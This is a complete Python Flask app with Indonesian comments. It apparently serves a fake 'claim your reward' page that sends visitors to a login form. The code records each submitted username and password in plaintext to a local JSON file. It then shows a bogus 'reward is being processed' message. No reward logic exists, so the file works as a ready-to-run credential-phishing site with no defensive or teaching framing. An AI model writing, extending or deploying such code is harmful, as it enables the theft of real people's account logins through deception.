# app.py
from flask import Flask, render_template, request, redirect
import json
import os

app = Flask(__name__)

# File untuk menyimpan data login
DATA_FILE = 'data/login_data.json'
os.makedirs('data', exist_ok=True)

# Fungsi simpan data
def simpan_data(userdata):
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                data = json.load(f)
        else:
            data = []
        data.append(userdata)
        with open(DATA_FILE, 'w') as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        print("Gagal simpan data:", e)

@app.route('/')
def index():
    return render_template('claim.html')

@app.route('/claim/<tipe>')
def klaim(tipe):
    return redirect('/login')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        simpan_data({"username": username, "password": password})
        return redirect('/success')
    return render_template('login.html')

@app.route('/success')
def success():
    return '<h2 style="text-align:center; margin-top:100px;">Success! Your reward is being processed...</h2>'

if __name__ == '__main__':
    app.run(debug=True)
